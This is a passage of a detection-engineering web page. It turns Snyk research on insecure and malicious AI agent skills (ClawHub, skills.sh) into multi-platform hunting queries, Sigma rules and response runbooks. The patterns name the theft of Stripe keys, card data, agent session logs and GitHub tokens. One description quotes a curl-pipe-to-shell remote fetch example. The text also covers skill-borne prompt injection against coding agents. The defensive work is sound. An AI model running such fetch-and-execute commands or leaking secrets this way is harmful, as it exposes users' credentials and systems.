-| where CommandLine has_any (&quot;card[number]=&quot;,&quot;card[cvc]=&quot;,&quot;pk_live_&quot;,&quot;sk_live_&quot;)
-| where AccountName !endswith &quot;$&quot;
-| project TimeGenerated, Computer, Account, NewProcessName, CommandLine, ParentProcessName
-| order by TimeGenerated desc</code></pre></div>
-    <div class="tab-content" id="art-606-uc1-sigma"><pre><button class="copy-btn">COPY</button><code>title: AI Agent Skill Leaks Stripe Key or Card Data via curl
-id: 9b2c3d7e-4f5a-5a6b-0c1d-2e3f4a5b6c7d
-description: Detects curl/bash invocations embedding live Stripe keys (pk_live_/sk_live_) or raw card numbers in command lines for api.stripe.com/v1/tokens or moltyverse.email — matching the Snyk-disclosed insecure pattern in ClawHub buy-anything v2.0.0 and moltyverse-email v1.1.0.
-references:
-  - https://snyk.io/blog/openclaw-skills-credential-leaks-research/
-author: Detection Engineering
-date: 2026/02/05
-tags:
-  - attack.exfiltration
-  - attack.t1552.001
-  - attack.t1071.001
-logsource:
-  category: process_creation
-  product: windows
-detection:
-  selection_target:
-    CommandLine|contains:
-      - &#x27;api.stripe.com/v1/tokens&#x27;
-      - &#x27;moltyverse.email/inbox&#x27;
-      - &#x27;api.moltyverse.email&#x27;
-  selection_secret:
-    CommandLine|contains:
-      - &#x27;card[number]=&#x27;
-      - &#x27;card[cvc]=&#x27;
-      - &#x27;pk_live_&#x27;
-      - &#x27;sk_live_&#x27;
-  condition: selection_target and selection_secret
-level: high</code></pre></div>
-    <div class="tab-content" id="art-606-uc1-datadog"><pre><button class="copy-btn">COPY</button><code>source:windows.sysmon @EventID:1 @CommandLine:(&quot;api.stripe.com/v1/tokens&quot; OR &quot;moltyverse.email/inbox&quot; OR &quot;api.moltyverse.email&quot;) AND @CommandLine:(&quot;card[number]=&quot; OR &quot;card[cvc]=&quot; OR &quot;pk_live_&quot; OR &quot;sk_live_&quot;)</code></pre></div>
-    <div class="tab-content" id="art-606-uc1-falcon"><pre><button class="copy-btn">COPY</button><code>#event_simpleName=ProcessRollup2
-| CommandLine=/api\.stripe\.com\/v1\/tokens|moltyverse\.email\/inbox|api\.moltyverse\.email/i
-| CommandLine=/card\[number\]=|card\[cvc\]=|pk_live_|sk_live_/i
-| groupBy([aid, ComputerName, UserName, ImageFileName, CommandLine], function=count())</code></pre></div>
-    <div class="tab-content" id="art-606-uc1-spl"><span class="splunk-cat-pill splunk-cat-endpoint" title="Splunk-research detection category">ENDPOINT</span><div class="spl-toggle-group"><div class="spl-mode-toggle">  <button class="spl-mode-btn active" data-spl-mode="acc" data-target="art-606-uc1-spl-acc">Summarised</button>  <button class="spl-mode-btn" data-spl-mode="raw" data-target="art-606-uc1-spl-raw">Non-summarised</button>  <span class="spl-mode-hint">Toggle if your env has no CIM data-model acceleration.</span></div><pre class="spl-mode-body active" id="art-606-uc1-spl-acc"><button class="copy-btn">COPY</button><code>| tstats summariesonly=true count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where (Processes.process=&quot;*api.stripe.com/v1/tokens*&quot; OR Processes.process=&quot;*moltyverse.email/inbox*&quot; OR Processes.process=&quot;*api.moltyverse.email*&quot;) AND (Processes.process=&quot;*card[number]=*&quot; OR Processes.process=&quot;*card[cvc]=*&quot; OR Processes.process=&quot;*pk_live_*&quot; OR Processes.process=&quot;*sk_live_*&quot;) by Processes.dest Processes.user Processes.process Processes.process_name Processes.parent_process_name | `drop_dm_object_name(Processes)` | `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)`</code></pre><pre class="spl-mode-body" id="art-606-uc1-spl-raw"><button class="copy-btn">COPY</button><code>| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where (Processes.process=&quot;*api.stripe.com/v1/tokens*&quot; OR Processes.process=&quot;*moltyverse.email/inbox*&quot; OR Processes.process=&quot;*api.moltyverse.email*&quot;) AND (Processes.process=&quot;*card[number]=*&quot; OR Processes.process=&quot;*card[cvc]=*&quot; OR Processes.process=&quot;*pk_live_*&quot; OR Processes.process=&quot;*sk_live_*&quot;) by Processes.dest Processes.user Processes.process Processes.process_name Processes.parent_process_name | `drop_dm_object_name(Processes)` | `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)`</code></pre></div></div>
-  </div>
-</details>
-<details class="uc" data-uc-slug="27ad6e7cc7" data-platforms="datadog,def,falcon,sent,sigma,spl" data-targets="linux,windows">
-  <summary>
-    <span class="uc-title">AI session-log harvest via prompt-log extract.sh writing markdown with embedded secrets</span>
-    <span class="uc-kind" title="AI-generated for this specific article — drafted from the article text and cross-checked against vendor advisories">AI</span><span class="uc-phase">Actions on Objectives</span>
-    <span class="uc-conf medium">Medium</span>
-    <button class="share-btn" data-share-uc="27ad6e7cc7" title="Copy share link to this UC" aria-label="Copy share link">
-      <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>
-    </button>
-  </summary>
-  <div class="uc-body">
-    <div class="uc-desc">Detects the ClawHub prompt-log skill&#x27;s `scripts/extract.sh` reading `.jsonl` session transcripts from agent session directories (~/.codex/sessions, ~/.claude/projects, ~/.clawdbot/agents) and emitting a markdown transcript to `.prompt-log/`. As noted by Snyk, this step re-exposes any plaintext credentials handled in earlier agent interactions as a static, shareable artifact.
-
-Rationale: Article literally shows the prompt-log usage examples: `scripts/extract.sh ~/.codex/sessions/2026/01/12/abcdef.jsonl` and `scripts/extract.sh ~/.claude/projects/my-proj/xyz.jsonl --output my-transcript.md`, with default output `.prompt-log/YYYY-MM-DD-HHMMSS.md`. Combining the script name with any of the three session-directory patterns (or the .prompt-log output path) gives a high-fidelity, article-specific hit.</div>
-    <div class="uc-meta"><span class="ind-label">ATT&amp;CK</span><span class="ind tech" title="Data from Local System">T1005</span> <span class="ind tech" title="Credentials In Files">T1552.001</span> <span class="ind tech" title="Data from Information Repositories">T1213</span></div>
-    <div class="uc-meta"><span class="ind-label">Data sources</span><span class="ind">Endpoint.Processes</span> <span class="ind">Endpoint.Filesystem</span></div>
-    <details class="uc-fp"><summary>Expected false positives · estimated rate: low<span class="uc-fp-note"> — model-assessed, tune to your environment</span></summary><ul><li>Legitimate developer exporting their own session transcripts to share a bug repro with vendor support</li><li>Internal IR/forensics team triaging an AI agent incident by extracting session logs</li><li>Snyk Evo Agent Security Analyzer or other auditing tool walking session directories during a research scan</li><li>Developer using a similarly-named extract.sh for unrelated jq/jsonl batch processing</li></ul><div class="uc-fp-filter"><span class="ind-label">Suppression filter</span><pre><code>| where InitiatingProcessCommandLine !has &quot;--output&quot; or InitiatingProcessCommandLine has_any (&quot;--after&quot;,&quot;--before&quot;) | where InitiatingProcessParentFileName !in~ (&quot;ir-toolkit.sh&quot;,&quot;forensics-collector.exe&quot;)</code></pre></div></details><details class="uc-fp"><summary>Response runbook</summary><div class="uc-runbook">Step 1 (Triage): Locate the produced markdown (default `.prompt-log/YYYY-MM-DD-HHMMSS.md`). Read it and inventory any secrets it now contains in plaintext: Stripe keys, moltyverse API keys, card data, OAuth tokens, internal API tokens. Step 2 (Contain): Quarantine the markdown — delete from host and from any sync targets (OneDrive, Dropbox, iCloud, git working trees, Slack uploads, GitHub gists). Uninstall the prompt-log skill: `clawhub uninstall prompt-log`. Rotate every identified secret. Step 3 (Hunt): Search the org for any other `.prompt-log/*.md` files via DeviceFileEvents/auditd; check git history (git log --all -- &#x27;**/.prompt-log/**&#x27;) for accidental commits; review DLP/CASB logs for outbound .md uploads from the host; pivot to UC1 to see if other vulnerable skills are installed.</div></details>
-    <div class="tabs">
-      <button class="tab-btn active" data-target="art-606-uc2-kql">Defender KQL</button>
-      <button class="tab-btn" data-target="art-606-uc2-sentinel">Sentinel KQL</button>
-      <button class="tab-btn" data-target="art-606-uc2-sigma">Sigma</button>
-      <button class="tab-btn" data-target="art-606-uc2-datadog">Datadog</button>
-      <button class="tab-btn" data-target="art-606-uc2-falcon">Falcon LogScale</button>
-      <button class="tab-btn" data-target="art-606-uc2-spl">Splunk SPL (CIM)</button>
-    </div>
-    <div class="tab-content active" id="art-606-uc2-kql"><pre><button class="copy-btn">COPY</button><code>let SessionAnchors = dynamic([&quot;.codex/sessions&quot;,&quot;.claude/projects&quot;,&quot;.clawdbot/agents&quot;,&quot;.jsonl&quot;,&quot;.prompt-log&quot;]);
-let ProcHits = DeviceProcessEvents
-| where Timestamp &gt; ago(7d)
-| where ProcessCommandLine has &quot;extract.sh&quot;
-| where ProcessCommandLine has_any (SessionAnchors)
-| where AccountName !endswith &quot;$&quot;
-| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine;
-let FileHits = DeviceFileEvents
-| where Timestamp &gt; ago(7d)
-| where ActionType in (&quot;FileCreated&quot;,&quot;FileRenamed&quot;,&quot;FileModified&quot;)
-| where FolderPath has &quot;.prompt-log&quot; and FileName endswith &quot;.md&quot;
-| where InitiatingProcessAccountName !endswith &quot;$&quot;
-| project Timestamp, DeviceName, AccountName=InitiatingProcessAccountName, FileName, ProcessCommandLine=InitiatingProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine;
-ProcHits
-| union FileHits
-| order by Timestamp desc</code></pre></div>
-    <div class="tab-content" id="art-606-uc2-sentinel"><pre><button class="copy-btn">COPY</button><code>Syslog
-| where TimeGenerated &gt; ago(7d)
-| where SyslogMessage has &quot;extract.sh&quot;
-| where SyslogMessage has_any (&quot;.codex/sessions&quot;,&quot;.claude/projects&quot;,&quot;.clawdbot/agents&quot;,&quot;.prompt-log&quot;,&quot;.jsonl&quot;)
-| project TimeGenerated, Computer, ProcessName, SyslogMessage
-| union (
-    SecurityEvent
-    | where TimeGenerated &gt; ago(7d)
-    | where EventID == 4688
-    | where CommandLine has &quot;extract.sh&quot;
-    | where CommandLine has_any (&quot;.codex/sessions&quot;,&quot;.claude/projects&quot;,&quot;.clawdbot/agents&quot;,&quot;.prompt-log&quot;,&quot;.jsonl&quot;)
-    | where AccountName !endswith &quot;$&quot;
-    | project TimeGenerated, Computer, ProcessName=NewProcessName, SyslogMessage=CommandLine
-  )
-| order by TimeGenerated desc</code></pre></div>
-    <div class="tab-content" id="art-606-uc2-sigma"><pre><button class="copy-btn">COPY</button><code>title: AI Session Log Harvest via prompt-log extract.sh
-id: ac3d4e8f-5a6b-6c7d-1e2f-3a4b5c6d7e8f
-description: Detects the ClawHub prompt-log skill&#x27;s extract.sh reading .jsonl session transcripts from AI agent session directories and writing markdown to .prompt-log/. Per Snyk research, the resulting markdown can contain plaintext credentials handled in prior agent runs.
-references:
-  - https://snyk.io/blog/openclaw-skills-credential-leaks-research/
-author: Detection Engineering
-date: 2026/02/05
-tags:
-  - attack.collection
-  - attack.t1005
-  - attack.t1552.001
-logsource:
-  category: process_creation
-  product: linux
-detection:
-  selection_script:
-    CommandLine|contains: &#x27;extract.sh&#x27;
-  selection_paths:
-    CommandLine|contains:
-      - &#x27;.codex/sessions&#x27;
-      - &#x27;.claude/projects&#x27;
-      - &#x27;.clawdbot/agents&#x27;
-      - &#x27;.prompt-log&#x27;
-      - &#x27;.jsonl&#x27;
-  condition: selection_script and selection_paths
-level: medium</code></pre></div>
-    <div class="tab-content" id="art-606-uc2-datadog"><pre><button class="copy-btn">COPY</button><code>(source:linux.auditd OR source:windows.sysmon) @CommandLine:&quot;extract.sh&quot; AND @CommandLine:(&quot;.codex/sessions&quot; OR &quot;.claude/projects&quot; OR &quot;.clawdbot/agents&quot; OR &quot;.prompt-log&quot; OR &quot;.jsonl&quot;)</code></pre></div>
-    <div class="tab-content" id="art-606-uc2-falcon"><pre><button class="copy-btn">COPY</button><code>#event_simpleName=ProcessRollup2
-| CommandLine=/extract\.sh/i
-| CommandLine=/\.codex\/sessions|\.claude\/projects|\.clawdbot\/agents|\.prompt-log|\.jsonl/i
-| groupBy([aid, ComputerName, UserName, ImageFileName, CommandLine], function=count())</code></pre></div>
-    <div class="tab-content" id="art-606-uc2-spl"><span class="splunk-cat-pill splunk-cat-endpoint" title="Splunk-research detection category">ENDPOINT</span><div class="spl-toggle-group"><div class="spl-mode-toggle">  <button class="spl-mode-btn active" data-spl-mode="acc" data-target="art-606-uc2-spl-acc">Summarised</button>  <button class="spl-mode-btn" data-spl-mode="raw" data-target="art-606-uc2-spl-raw">Non-summarised</button>  <span class="spl-mode-hint">Toggle if your env has no CIM data-model acceleration.</span></div><pre class="spl-mode-body active" id="art-606-uc2-spl-acc"><button class="copy-btn">COPY</button><code>| tstats summariesonly=true count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where Processes.process=&quot;*extract.sh*&quot; AND (Processes.process=&quot;*.codex/sessions*&quot; OR Processes.process=&quot;*.claude/projects*&quot; OR Processes.process=&quot;*.clawdbot/agents*&quot; OR Processes.process=&quot;*.prompt-log*&quot; OR Processes.process=&quot;*.jsonl*&quot;) by Processes.dest Processes.user Processes.process Processes.process_name Processes.parent_process_name | `drop_dm_object_name(Processes)` | `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)`</code></pre><pre class="spl-mode-body" id="art-606-uc2-spl-raw"><button class="copy-btn">COPY</button><code>| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where Processes.process=&quot;*extract.sh*&quot; AND (Processes.process=&quot;*.codex/sessions*&quot; OR Processes.process=&quot;*.claude/projects*&quot; OR Processes.process=&quot;*.clawdbot/agents*&quot; OR Processes.process=&quot;*.prompt-log*&quot; OR Processes.process=&quot;*.jsonl*&quot;) by Processes.dest Processes.user Processes.process Processes.process_name Processes.parent_process_name | `drop_dm_object_name(Processes)` | `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)`</code></pre></div></div>
-  </div>
-</details></div>
-</article>
-<article class="card" id="art-607" data-art-slug="2026-02-05-snyk-finds-prompt-injection-in-36-1467-malicious-payloads-in"
-  data-phases="actions,c2,delivery,exploit,install,recon" data-sev="crit"
-  data-techs="T1027,T1190,T1195.002"
-  data-sources="Snyk"
-  data-platforms="datadog,def,falcon,sent,sigma,spl"
-  data-splunk-cats="endpoint,network"
-  data-targets="windows"
-  data-uc-count="6" data-llm-uc-count="3"
-  data-search="Snyk Finds Prompt Injection in 36%, 1467 Malicious Payloads in a ToxicSkills Study of Agent Skills Supply Chain Compromise Snyk’s ToxicSkills research reveals 36% of AI agent skills contain security flaws, including 1,467 vulnerable skills and active malicious payloads targeting OpenClaw, Claude Code, and Cursor users.  T1027 T1190 T1195.002 [LLM] Dev endpoint contacts ClawHub / skills.sh agent-skill marketplace [LLM] AI coding agent spawns remote fetch-and-execute (curl | bash / curl | source) [LLM] AI agent skill exfiltrates GitHub token / env secrets via dynamic-context shell-out PowerShell encoded / obfuscated command Trusted vendor binary / installer launching unusual children Article-specific behavioural hunt — Snyk Finds Prompt Injection in 36%, 1467 Malicious Payloads in a ToxicSkills Stu">
-  <div class="sev-ribbon crit">Critical</div>
-  <button class="share-btn card-share" data-share-art="2026-02-05-snyk-finds-prompt-injection-in-36-1467-malicious-payloads-in" title="Copy share link to this article" aria-label="Copy share link">
-    <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>
-  </button>
-  <h2><a href="https://snyk.io/blog/toxicskills-malicious-ai-agent-skills-clawhub/" target="_blank" rel="noopener">Snyk Finds Prompt Injection in 36%, 1467 Malicious Payloads in a ToxicSkills Study of Agent Skills Supply Chain Compromise</a></h2>
-  <div class="source-badges"><span class="source-badge ">Snyk</span></div>
-  <div class="pubmeta">
-    <span>2026-02-05</span>
-    <span>6 use cases</span>
-    <span>3 techniques</span>
-    <span>6 kill-chain phases detected</span>
-  </div>
-  <p class="summary">Snyk’s ToxicSkills research reveals 36% of AI agent skills contain security flaws, including 1,467 vulnerable skills and active malicious payloads targeting OpenClaw, Claude Code, and Cursor users.</p>
-  <div class="ind-group"><span class="ind-label">ATT&amp;CK</span><span class="ind tech" title="Obfuscated Files or Information">T1027</span> <span class="ind tech" title="Exploit Public-Facing Application">T1190</span> <span class="ind tech" title="Compromise Software Supply Chain">T1195.002</span></div>
-  <div class="action-row">
-    <button class="btn btn-kc" data-target="art-607-kc"><svg class="kc-chev" width="11" height="11" viewBox="0 0 12 12" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polyline points="3 4.5 6 7.5 9 4.5"/></svg><span class="kc-label">Show kill chain</span></button>
-    <button class="btn btn-hunt" data-hunt-art="art-607"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="11" cy="11" r="7"/><path d="M21 21 L16.65 16.65"/></svg><span>Hunt IOCs</span></button>
-    <span class="btn-meta">Click any ATT&amp;CK pill below to open it on the Matrix</span>
-  </div>
-  <div class="killchain" id="art-607-kc">
-  <div class="kc3d"><div class="kc-cell hit">
-  <div class="num">Phase 1</div>
-  <div class="name">Reconnaissance</div>
-  <div class="marker">Detected</div>
-</div>
-<div class="kc-cell ">
-  <div class="num">Phase 2</div>
-  <div class="name">Weaponization</div>
-  <div class="marker">—</div>
-</div>
-<div class="kc-cell hit">
-  <div class="num">Phase 3</div>
-  <div class="name">Delivery</div>
-  <div class="marker">Detected</div>
-</div>
-<div class="kc-cell hit">
-  <div class="num">Phase 4</div>
-  <div class="name">Exploitation</div>
-  <div class="marker">Detected</div>
-</div>
-<div class="kc-cell hit">
-  <div class="num">Phase 5</div>
-  <div class="name">Installation</div>
-  <div class="marker">Detected</div>
-</div>
-<div class="kc-cell hit">
-  <div class="num">Phase 6</div>
-  <div class="name">Command &amp; Control</div>
-  <div class="marker">Detected</div>
-</div>
-<div class="kc-cell hit">
-  <div class="num">Phase 7</div>
-  <div class="name">Actions on Objectives</div>
-  <div class="marker">Detected</div>
-</div></div>
-  <div class="kc-detail"><div class="phase-line hit"><strong>Reconnaissance.</strong> Attacker researches the target — OSINT, scanning, enumeration.</div>
-<div class="phase-line "><strong>Weaponization.</strong> Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).</div>
-<div class="phase-line hit"><strong>Delivery.</strong> Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad). <em>→ [LLM] Dev endpoint contacts ClawHub / skills.sh agent-skill marketplace</em></div>
-<div class="phase-line hit"><strong>Exploitation.</strong> Triggering the exploit — vulnerability/macro/trust abuse to execute code. <em>→ PowerShell encoded / obfuscated command · Trusted vendor binary / installer launching unusual children · Article-specific behavioural hunt — Snyk Finds Prompt Injection in 36%, 1467 Malicious Payloads in a ToxicSkills Stu</em></div>
-<div class="phase-line hit"><strong>Installation.</strong> Establishing persistence on the host — backdoor, service, scheduled task, registry key. <em>→ [LLM] AI coding agent spawns remote fetch-and-execute (curl | bash / curl | source)</em></div>
-<div class="phase-line hit"><strong>Command &amp; Control.</strong> Beacon to attacker infrastructure for control and tasking.</div>
-<div class="phase-line hit"><strong>Actions on Objectives.</strong> Lateral movement, credential dumping, data theft, ransomware, sabotage. <em>→ [LLM] AI agent skill exfiltrates GitHub token / env secrets via dynamic-context shell-out</em></div></div>
-</div>
-  <div class="usecases"><details class="uc" data-uc-slug="f56b5382d5" data-platforms="datadog,def,falcon,sent,sigma,spl" data-targets="windows" open>
-  <summary>
-    <span class="uc-title">Dev endpoint contacts ClawHub / skills.sh agent-skill marketplace</span>
-    <span class="uc-kind" title="AI-generated for this specific article — drafted from the article text and cross-checked against vendor advisories">AI</span><span class="uc-phase">Delivery</span>
-    <span class="uc-conf medium">Medium</span>
-    <button class="share-btn" data-share-uc="f56b5382d5" title="Copy share link to this UC" aria-label="Copy share link">
-      <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>
-    </button>
-  </summary>
-  <div class="uc-body">
-    <div class="uc-desc">Surfaces developer workstations fetching Agent Skills from the ClawHub (clawhub.ai) and skills.sh / SkillsMP marketplaces named in the Snyk ToxicSkills audit. This is the supply-chain delivery step where 8 still-live malicious skills (Atomic Stealer droppers, credential thieves) are pulled onto a host running Claude Code, Cursor or OpenClaw.
-
-Rationale: Anchors on the two distribution domains named verbatim in the article (clawhub.ai, skills.sh) plus the SkillsMP marketplace corroborated by The Hacker News and Trend Micro; scoped to AI-agent and downloader processes to keep it host-relevant.
-
-Cross-checked against:
-  • https://snyk.io/blog/toxicskills-malicious-ai-agent-skills-clawhub/
-  • https://www.trendmicro.com/en_us/research/26/b/openclaw-skills-used-to-distribute-atomic-macos-stealer.html
-  • https://thehackernews.com/2026/02/researchers-find-341-malicious-clawhub.html</div>
-    <div class="uc-meta"><span class="ind-label">ATT&amp;CK</span><span class="ind tech" title="Compromise Software Supply Chain: Compromise Software Supply Chain">T1195.002</span> <span class="ind tech" title="Application Layer Protocol: Web Protocols">T1071.001</span></div>
-    <div class="uc-meta"><span class="ind-label">Data sources</span><span class="ind">Network_Traffic.All_Traffic</span> <span class="ind">Endpoint.Processes</span></div>
-    <details class="uc-fp"><summary>Expected false positives · estimated rate: medium<span class="uc-fp-note"> — model-assessed, tune to your environment</span></summary><ul><li>Developer legitimately browsing or installing a vetted skill from ClawHub/skills.sh</li><li>Security researcher reproducing the ToxicSkills findings</li><li>CI runner pulling a pinned, internally-approved skill</li><li>Corporate web proxy pre-fetching/sandboxing the URL on a user&#x27;s behalf</li><li>Marketing/blog traffic to snyk.io that 302-redirects through skills.sh</li></ul></details><details class="uc-fp"><summary>Response runbook</summary><div class="uc-runbook">1) Triage: identify the host and user; confirm whether an AI coding agent (Claude Code/Cursor/OpenClaw) is installed and which skill ID was fetched — inspect ~/.claude/skills/ and project .claude/skills/ for a new SKILL.md. 2) Contain: if the skill is unknown/unapproved, isolate the workstation, quarantine the SKILL.md, and treat any credentials reachable from that host (gh tokens, ~/.aws, ~/.ssh) as exposed. 3) Hunt: pivot on the same host for UC2 (curl|bash from the agent) and UC3 (gh auth token / env-dump exfil) within the following hours; check outbound POSTs to non-marketplace domains.</div></details>
-    <div class="tabs">
-      <button class="tab-btn active" data-target="art-607-uc0-kql">Defender KQL</button>
-      <button class="tab-btn" data-target="art-607-uc0-sentinel">Sentinel KQL</button>
-      <button class="tab-btn" data-target="art-607-uc0-sigma">Sigma</button>
-      <button class="tab-btn" data-target="art-607-uc0-datadog">Datadog</button>
-      <button class="tab-btn" data-target="art-607-uc0-falcon">Falcon LogScale</button>
-      <button class="tab-btn" data-target="art-607-uc0-spl">Splunk SPL (CIM)</button>
-    </div>
-    <div class="tab-content active" id="art-607-uc0-kql"><pre><button class="copy-btn">COPY</button><code>DeviceNetworkEvents
-| where Timestamp &gt; ago(30d)
-| where RemoteUrl has_any (&quot;clawhub.ai&quot;,&quot;skills.sh&quot;,&quot;skillsmp&quot;)
-| where InitiatingProcessFileName in~ (&quot;node&quot;,&quot;node.exe&quot;,&quot;claude&quot;,&quot;claude.exe&quot;,&quot;cursor&quot;,&quot;cursor.exe&quot;,&quot;openclaw&quot;,&quot;openclaw.exe&quot;,&quot;curl&quot;,&quot;curl.exe&quot;,&quot;wget&quot;,&quot;powershell.exe&quot;,&quot;pwsh&quot;)
-| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, RemoteUrl, RemoteIP, RemotePort
-| order by Timestamp desc</code></pre></div>
-    <div class="tab-content" id="art-607-uc0-sentinel"><pre><button class="copy-btn">COPY</button><code>DnsEvents
-| where TimeGenerated &gt; ago(30d)
-| where Name has_any (&quot;clawhub.ai&quot;,&quot;skills.sh&quot;,&quot;skillsmp&quot;)
-| project TimeGenerated, Computer, ClientIP, Name, QueryType, ResultCode
-| order by TimeGenerated desc</code></pre></div>
-    <div class="tab-content" id="art-607-uc0-sigma"><pre><button class="copy-btn">COPY</button><code>title: Endpoint Resolves Agent-Skill Marketplace Domain (ClawHub / skills.sh)
-id: 2f1c9b4e-7a3d-4f0e-9c21-8e6b1d2a44c1
-description: Detects DNS resolution of the ClawHub and skills.sh Agent Skills marketplaces named in the Snyk ToxicSkills audit, the supply-chain delivery vector for malicious AI agent skills.
-references:
-  - https://snyk.io/blog/toxicskills-malicious-ai-agent-skills-clawhub/
-  - https://www.trendmicro.com/en_us/research/26/b/openclaw-skills-used-to-distribute-atomic-macos-stealer.html
-author: SOC Detection Engineering
-date: 2026/06/26
-tags:
-  - attack.t1195.002
-  - attack.initial_access
-logsource:
-  category: dns
-detection:
-  selection:
-    query|contains:
-      - &#x27;clawhub.ai&#x27;
-      - &#x27;skills.sh&#x27;
-      - &#x27;skillsmp&#x27;
-  condition: selection
-level: medium</code></pre></div>
-    <div class="tab-content" id="art-607-uc0-datadog"><pre><button class="copy-btn">COPY</button><code>source:windows.sysmon @EventID:22 (@QueryName:(*clawhub.ai* OR *ClawHub.ai*) OR @QueryName:(*skills.sh*) OR @QueryName:(*skillsmp*))</code></pre></div>
-    <div class="tab-content" id="art-607-uc0-falcon"><pre><button class="copy-btn">COPY</button><code>#event_simpleName=DnsRequest DomainName=/(clawhub\.ai|skills\.sh|skillsmp)/i
-| groupBy([aid, ComputerName, ContextImageFileName, DomainName], function=count())
-| sort(count, order=desc)</code></pre></div>
-    <div class="tab-content" id="art-607-uc0-spl"><span class="splunk-cat-pill splunk-cat-network" title="Splunk-research detection category">NETWORK</span><div class="spl-toggle-group"><div class="spl-mode-toggle">  <button class="spl-mode-btn active" data-spl-mode="acc" data-target="art-607-uc0-spl-acc">Summarised</button>  <button class="spl-mode-btn" data-spl-mode="raw" data-target="art-607-uc0-spl-raw">Non-summarised</button>  <span class="spl-mode-hint">Toggle if your env has no CIM data-model acceleration.</span></div><pre class="spl-mode-body active" id="art-607-uc0-spl-acc"><button class="copy-btn">COPY</button><code>| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime values(All_Traffic.dest) as dest from datamodel=Network_Traffic.All_Traffic where (All_Traffic.dest=&quot;*clawhub.ai*&quot; OR All_Traffic.dest=&quot;*skills.sh*&quot; OR All_Traffic.dest=&quot;*skillsmp*&quot;) by All_Traffic.src All_Traffic.app All_Traffic.dest_port All_Traffic.dest | `drop_dm_object_name(All_Traffic)` | convert ctime(firstTime) ctime(lastTime) | sort - lastTime</code></pre><pre class="spl-mode-body" id="art-607-uc0-spl-raw"><button class="copy-btn">COPY</button><code>| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime values(All_Traffic.dest) as dest from datamodel=Network_Traffic.All_Traffic where (All_Traffic.dest=&quot;*clawhub.ai*&quot; OR All_Traffic.dest=&quot;*skills.sh*&quot; OR All_Traffic.dest=&quot;*skillsmp*&quot;) by All_Traffic.src All_Traffic.app All_Traffic.dest_port All_Traffic.dest | `drop_dm_object_name(All_Traffic)` | convert ctime(firstTime) ctime(lastTime) | sort - lastTime</code></pre></div></div>
-  </div>
-</details>
-<details class="uc" data-uc-slug="108929a92a" data-platforms="datadog,def,falcon,sent,sigma,spl" data-targets="windows">
-  <summary>
-    <span class="uc-title">AI coding agent spawns remote fetch-and-execute (curl | bash / curl | source)</span>
-    <span class="uc-kind" title="AI-generated for this specific article — drafted from the article text and cross-checked against vendor advisories">AI</span><span class="uc-phase">Installation</span>
-    <span class="uc-conf high">High</span>
-    <button class="share-btn" data-share-uc="108929a92a" title="Copy share link to this UC" aria-label="Copy share link">
-      <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>
-    </button>
-  </summary>
-  <div class="uc-body">
-    <div class="uc-desc">Detects an AI coding agent process (Claude Code/node, Cursor, OpenClaw) spawning a shell that pipes a remote download straight into an interpreter — the &#x27;unverifiable dependencies&#x27; / dynamic runtime-fetch behaviour Snyk found in 2.9% of ClawHub skills and 21% of confirmed-malicious samples (e.g. `curl https://remote/instructions.md | source`). Lets benign-at-review skills mutate behaviour post-publish.
-
-Rationale: Pairs the AI-agent parent process (the article&#x27;s affected products) with the curl|bash / curl|source remote-execute primitive that corroborating Datadog and Snyk reporting cite as the dynamic-context attack; parent+behaviour pairing keeps it high-fidelity rather than a bare curl alert.
-
-Cross-checked against:
-  • https://snyk.io/blog/toxicskills-malicious-ai-agent-skills-clawhub/
-  • https://securitylabs.datadoghq.com/articles/malicious-skills-supply-chain-risks-in-coding-agents-with-dynamic-context/
-  • https://thehackernews.com/2026/02/researchers-find-341-malicious-clawhub.html</div>
